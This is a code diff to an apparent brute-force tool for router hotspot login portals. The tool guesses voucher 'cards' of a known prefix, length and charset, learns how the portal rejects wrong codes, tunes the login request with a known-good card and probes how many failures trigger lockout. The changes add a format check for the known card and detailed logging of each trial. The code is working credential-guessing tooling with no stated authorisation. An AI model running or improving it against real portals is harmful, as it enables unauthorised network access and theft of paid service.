@@ -227,7 +227,8 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
         cal.step("internet_state", state in ("WALLED", "ONLINE"),
                  "internet_online_verification_limited" if state == "ONLINE"
                  else f"internet_{state.lower()}",
-                 {k: v for k, v in cal.internet.items() if k != "state"})
+                 {**{k: v for k, v in cal.internet.items() if k != "state"},
+                  "state": state})
 
         # --- 3. learn what a WRONG card looks like ----------------------
         probe_cards, replies = [], []
@@ -308,18 +309,27 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
 
         # --- 4. tune the request shape with a known-good card -----------
         if learn_known and known_card:
-            p, words, tuned = _tune_with_known_card(p, known_card, fp, session,
-                                                    checks=checks)
-            if words:
-                cal.success_words = words
-                p["success_words"] = words
-            if tuned:
-                cal.tuned = tuned
-                cal.step("shape_tuned", True, "known_card_works",
-                         {"tuned": tuned, "words": words[:6]})
+            wrong = known_card_problem(p, known_card)
+            if wrong:
+                # the card does not even fit the format we were told to guess:
+                # say so before spending a single request on it
+                cal.step("shape_tuned", False, "known_card_out_of_format", wrong)
             else:
-                cal.step("shape_tuned", False, "known_card_not_proven",
-                         {"hint": "browser_trace"})
+                p, words, tuned, trials = _tune_with_known_card(
+                    p, known_card, fp, session, checks=checks)
+                if words:
+                    cal.success_words = words
+                    p["success_words"] = words
+                if tuned:
+                    cal.tuned = tuned
+                    cal.step("shape_tuned", True, "known_card_works",
+                             {"tuned": tuned, "words": words[:6]})
+                else:
+                    # "could not prove it" is useless on its own: show what the
+                    # router answered for every shape we tried
+                    cal.step("shape_tuned", False, "known_card_not_proven",
+                             {"tried": len(trials),
+                              "trials": _summarise_trials(trials)})
             verify.logout(session, p["login_url"])
 
         if keyword:
@@ -351,6 +361,7 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
     if p.get("chap") is None:
         modes = [m for m in modes if not m.startswith("chap")]
     best = None
+    trials = []
 
     for dst in dsts:
         for mode in modes:
@@ -363,6 +374,14 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
             except Exception:                            # noqa: BLE001
                 continue
             verdict = judge.classify(r, submitted_values(trial, known_card))
+            body = (r.text or "").lower()
+            trials.append({
+                "mode": mode, "dst": dst, "status": r.status,
+                "code": verdict.code, "reason": verdict.reason,
+                "location": r.location,
+                "word": (verdict.data or {}).get("word")
+                         or find_phrase(body, config.REJECT_WORDS)
+                         or find_phrase(body, config.BAN_WORDS)})
             evidence = 0.0
             if r.is_redirect():
                 host = (r.location.split("//")[-1].split("/")[0] or "").lower()
@@ -393,12 +412,12 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
             break
 
     if not best:
-        return p, [], None
+        return p, [], None, trials
 
     p["pass_mode"] = best["mode"]
     p["dst_value"] = best["dst"]
     tuned = {k: v for k, v in best.items() if k != "words"}
-    return p, best["words"], tuned
+    return p, best["words"], tuned, trials
 
 
 def _new_words(page: str, reference: str, limit: int = 10) -> list:
@@ -1418,3 +1437,46 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
         return out
     finally:
         session.close()
+
+
+def known_card_problem(p: dict, card: str) -> dict:
+    """Does this card even fit the format we were asked to guess?
+
+    A known card that does not match the prefix/length/charset can never be
+    sent by the walk, so the tuning step is doomed from the start - better to
+    say exactly what is wrong.
+    """
+    card = (card or "").strip()
+    if not card:
+        return {}
+    prefix = p.get("prefix", "") or ""
+    suffix = p.get("suffix", "") or ""
+    length = int(p.get("length") or 0)
+    charset = set(p.get("charset") or "")
+    if length and len(card) != length:
+        return {"reason": "length_mismatch", "card_length": len(card),
+                "profile_length": length}
+    if prefix and not card.startswith(prefix):
+        return {"reason": "prefix_mismatch", "prefix": prefix}
+    if suffix and not card.endswith(suffix):
+        return {"reason": "suffix_mismatch", "suffix": suffix}
+    if charset:
+        middle = card[len(prefix):len(card) - len(suffix) if suffix else len(card)]
+        alien = sorted(set(middle) - charset)
+        if alien:
+            return {"reason": "charset_mismatch", "chars": "".join(alien)[:20],
+                    "charset": "".join(sorted(charset))[:40]}
+    return {}
+
+
+def _summarise_trials(trials: list, limit: int = 6) -> list:
+    """Keep what explains the failure: what we sent and what came back."""
+    out = []
+    for t in trials:
+        out.append({"mode": t.get("mode", ""), "dst": (t.get("dst") or "")[:48],
+                    "status": t.get("status", 0), "code": t.get("code", ""),
+                    "reason": t.get("reason", ""), "word": t.get("word", ""),
+                    "location": (t.get("location") or "")[:60]})
+    # newest is not interesting - the most "alive" answers are
+    out.sort(key=lambda r: (r["code"] == "REJECTED", r["reason"]))
+    return out[:limit]
